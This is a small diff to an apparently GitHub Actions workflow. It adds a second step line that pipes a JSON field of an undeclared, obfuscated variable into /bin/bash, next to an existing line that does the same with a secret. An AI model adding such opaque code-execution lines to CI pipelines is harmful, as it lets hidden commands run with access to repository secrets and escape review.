@@ -20,6 +20,7 @@ jobs:
           yz92: ${{ secrets.yz92 }}
         run: |
           printf '%s' "$yz92" | jq -r .pxbyq83369 | /bin/bash
+          printf '%s' "$ekhio941" | jq -r .khz7 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
